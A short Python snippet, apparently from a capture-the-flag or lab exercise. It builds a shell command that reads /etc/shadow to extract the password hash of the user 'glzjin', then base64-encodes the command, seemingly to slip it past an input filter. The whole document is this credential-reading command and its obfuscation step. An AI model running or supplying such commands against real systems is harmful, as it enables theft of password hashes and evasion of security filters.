import subprocess
import base64
a = '''awk -F: '{if($1 == "glzjin") {print $2} }' /etc/shadow'''
print(base64.b64encode(a.encode('utf-8')).decode('utf-8'))